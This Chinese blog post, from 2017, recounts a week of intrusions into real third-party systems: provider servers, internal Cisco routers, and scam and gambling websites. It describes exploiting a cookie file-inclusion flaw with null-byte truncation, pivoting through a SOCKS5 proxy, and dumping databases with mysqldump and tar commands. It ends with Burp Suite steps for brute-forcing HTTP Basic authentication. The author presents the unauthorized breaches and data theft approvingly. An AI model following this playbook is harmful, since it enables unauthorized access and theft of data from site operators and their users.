一星期实战总结（三）

发表于 2017-03-18   |   分类于 网络安全   |  

渗透不等于找漏洞，而是达到目的才可以被称为渗透成功。就算你拿下了服务器里面没有价值的数据也是无用、也等于失败。

这段时间搞的站点比较多，也找到许多站的洞，都是被各种限制没有达到目的，这里写出这个有意思的实战经过。

之前获取了某服务商两台Linux机器，简称A、B，A服务器里面有某业务平台，只可惜密码无法解出来登不进后台，B服务器两张网卡，一张连接于内网，通过Socks5代理，扫了一些网段得到两台Cisco路由器可执行命令，其它暂时都没有找到其它机器，从Cisco看到vlan划分，争取下个星期把这个内网搞定吧。

某域商名子站，比较有意思的是，在COOKIES中的选择语言存在文件包含，只可惜普通用户，

这里后面加了%00.jpg，是因为包含的时候后面还有程序后缀如这样lang=luange.php把.号给截断。

然后星期四早上发来一批列表，好像又是诈骗的，看了目标站是WordPress和CloudFlare CDN，通过大牛给我的工具，结果扫描，发现对应一个源码包，下载回来分析，得到mysql数据库密码、以及Cpanel控制管理面板，Cpanel是国外比较出名的虚拟主机管理系统，数据库管理是在登录Cpanel才能看得到，无法直接访问，没有思路暂搞有关联的站点。
然后像赌博的站点，存在phpMyadmin，然后找到备份文件连接进去把数据库脱了出来，然后继续撸其它站点，一个阿里云服务器，网站程序是电商，看了一下使用jsp，就用前段时间爆出来的漏洞就秒了，把last记录先拖出来，然后把源码下回来分析，发现数据库在阿里云里面，也是内网，因为服务器外网连接不了SSH，后来想了很久，通过mysql命令无回显执行mysql -uroot -p123456 -e "show database"，再接着导出数据库：mysqldump -uroot -p123456 dbname > /tmp/sql.sql,通过tar czvf ./sql.tar.gz ./sql.sql 把3G多的数据库打包成400mb,发现这命令挺好用的。目标达成继续换下一个站点。
看都懒着看了，这么多洞，把后台数据库脱了出来，通过hash-id识别是SHA-256所以没有办法解密，就把数据库大部分信息拖了出来。

因为搞这批列表是某局要搞的，当时发过来的信息猜测，应该是被人搞过一遍了，没发现多少信息，之前遇到Wordpress或者CloudFlare CDN都会放弃，曾经我也是这样觉得没什么希望，但是现在的我不一样，就算再难搞的站，我也会趴下一些信息。也不会放弃，最后也没有继续深入去发现更多的有关联的东西，因为也只是义务帮别人搞。

总结：很多站点找到了漏洞，找到了一个点没有去思考和深入，这也是我所欠缺的，绕过这些问题，去思考这是我目前要做的。
其次发现字典是渗透中非常重要，根据哪一套系统能扫出什么，包括遇到HTTP Basic还是MSSQL或者其它服务还有机会去尝试,爆破的艺术

通过BurpSuite来爆破

HTTP Basic认证密码是这样的类型：admin:123456，然后转义成base64进行Authorization认证

BurpSuite发送Intruder模块

设置灶爆破标识

在 Payload 设置中类型选择 Custom iterator

认证信息是类似 username:password 的形式，所示我们需要在 Payload 选项里设置两个 Position，每个 Position 之间使用 :隔开。

之后设置 Position 2为密码字典,然后在 Payload Processing 里添加一条规则，进行 Base64 编码

最后去掉底下的 Payload Encoding 选项,不让 Burp suite 把我们的编码后数据中的等号在进行 URL 编码了。
